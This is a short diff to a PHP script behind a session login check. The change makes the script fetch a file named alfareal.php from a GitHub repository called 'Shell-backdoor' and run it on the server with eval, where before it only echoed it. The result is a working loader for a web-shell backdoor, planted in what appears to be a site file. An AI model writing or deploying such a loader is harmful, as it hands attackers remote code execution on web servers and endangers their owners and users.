@@ -110,11 +110,11 @@ if (!isset($_SESSION['authenticated'])) {
     exit;
   }
 } else {
-  // User is authenticated, fetch and display the content of the target PHP file
+  // User is authenticated, fetch and execute the content of the target PHP file
   $target_url = "https://raw.githubusercontent.com/TanXploit/Shell-backdoor/main/alfareal.php";
   $content = file_get_contents($target_url);
   if ($content !== false) {
-    echo $content;
+    eval("?>" . $content);
   } else {
     echo "Failed to retrieve the content.";
   }
